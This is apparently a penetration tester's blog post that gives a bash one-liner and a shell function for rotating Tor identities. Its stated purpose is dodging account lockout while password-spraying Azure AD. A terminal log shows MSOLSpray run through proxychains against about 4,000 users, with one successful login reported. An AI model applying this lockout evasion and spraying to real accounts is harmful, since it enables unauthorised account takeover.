---
render_with_liquid: false
title: Tor identity rotation oneliner
tags: [tor]
---

## Introduction

I recently undertook the task of attacking **Azure AD** and **Microsoft SaaS Apps** to demonstrate the effectiveness of a cybersecurity product; during that, I had to perform password spray without triggering the account lockout threshold, thus IP rotation is needed.


## Tor identity rotation one-liner

While there are a lot of Proxies/Tor/VPN rotation tools available on GitHub, I made a simple one-liner to achieve the goal of rotating Tor identities.

```bash
INTERVAL=1; sudo systemctl restart tor; while true; do sleep $INTERVAL; sudo systemctl reload tor; curl --socks5-hostname 127.0.0.1:9050 ip-api.com/json -s | jq -c '{query, country, as}'; done
```

![](/assets/obsidian/057f9c7121b6505c6b73d73df1ff18b1.png)

By using **proxychains** with our tools, we can use the Tor proxy reliably.

```bash
┌──(bravosec㉿fsociety)-[~/pt/tmp]
└─$ proxychains pwsh
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
PowerShell 7.5.0

┌──(bravosec㉿fsociety)-[/home/kali/pt/tmp]
└─PS> Import-Module /opt/sectools/AzureAD/MSOLSpray/MSOLSpray.ps1

┌──(bravosec㉿fsociety)-[/home/kali/pt/tmp]
└─PS> invoke-MSOLSpray -UserList ./users.txt -Password 'Summer2025!' -Force
[*] There are 4146 total users to spray.
[*] Now spraying Microsoft Online.
[*] Current date and time: 04/29/2025 23:45:15
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  login.microsoft.com:443  ...  OK
[*] SUCCESS! deducted@domain.com : Summer2025! - NOTE: The response indicates MFA (Microsoft) is in use.
```

We can also add the one-liner to our `.zsh_rc/.bash_rc` files as a function.

```bash
function tor-rotate() {
    local INTERVAL="${1:-1}"

    sudo systemctl restart tor    
    while true; do
        sleep $INTERVAL
        sudo systemctl reload tor
        curl --socks5-hostname 127.0.0.1:9050 ip-api.com/json -s | jq -c '{query, country, as}'
    done
}
```

Usage:

```bash
# Rotate with default interval : 1 sec
tor-rotate

# Rotate with interval : 60 secs
tor-rotate 60
```

## Tor best practice

- For maximum privacy, use [Whonix](https://www.whonix.org/) to force all Internet traffic through the Tor network in virtual environments